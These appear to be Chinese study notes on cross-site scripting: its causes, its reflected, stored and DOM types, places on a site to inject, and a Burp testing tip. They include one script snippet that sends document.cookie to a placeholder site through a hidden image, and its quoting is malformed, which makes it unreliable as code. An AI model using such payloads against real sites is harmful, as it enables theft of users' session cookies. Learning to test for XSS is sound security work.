**测试的时候一定要用 **`**console.log() **`**, 不要用 **`**alert()**`
# XSS产生关键点：
用户提交（主动或被动）的数据内容被输出到html页面中程序没有对用户提交内容做合理的处理，导致用户可以改变原有html语义或添加额外的html语句

# XSs类型

1. **反射型**测试语句经后端程序处理后直接输出，且不会对测试语句保存
2. **存储型**测试语句经后端程序处理后保存，且会在相应位置输出测试语句
3. **DOM型**测试语句由前端js代码输出，不局限于是否存储（绝大部分为反射型）
> **DOM型可能是反射型, 也可能是存储型**


```
<script>
document.write(
	'<img src = "可能有xss的网站"+document.cookie+'"width='0' height='0'"' "/>');
</script>
```


# XSS的payload 
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1678890458994-81a61a30-4f9c-495e-be12-6b37dd63b7d4.png#averageHue=%23edecec&clientId=u197c21ea-fbb8-4&from=paste&height=386&id=ue396f32b&originHeight=434&originWidth=1089&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=158279&status=done&style=none&taskId=u36719207-d24b-401f-bd74-e73d3ca1fb4&title=&width=968)
http://html5sec.org

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1678921098273-cdbe228d-53c4-4b5d-8976-45591b6fe9a6.png#averageHue=%23e6e5e4&clientId=uce424485-f0c4-4&from=paste&height=460&id=u50bc8c68&originHeight=517&originWidth=896&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=321807&status=done&style=none&taskId=ud2fc74a4-413b-4e7a-884d-e13c722270d&title=&width=796.4444444444445)

# 常见的html编码
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1678919801482-cd94f273-52ca-498b-bee6-94ac14a054e1.png#averageHue=%23ededed&clientId=u197c21ea-fbb8-4&from=paste&height=374&id=u1f88fbe9&originHeight=421&originWidth=1132&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=153583&status=done&style=none&taskId=ufa8efe2b-ffae-4f8a-8afa-7314367c8f8&title=&width=1006.2222222222222)

# 应用场景
站内用户间私信
个人资料编辑(昵称, 邮箱, 姓名, 地址)
站点内容发布(发表文章, 发表评论)
客服对话窗口
订单流程(备注信息, 收获地址, 姓名)
富文本编辑框, 一般是不会过滤` img `标签的, 可以试一试.

# 小技巧
> 当页面有多个输入框的时候, 一个个测试太麻烦, 使用BP抓包, 然后

1. 对每个位置分别写入顺序字符进行标记
2. 写入测试字符，观察字符返回情况


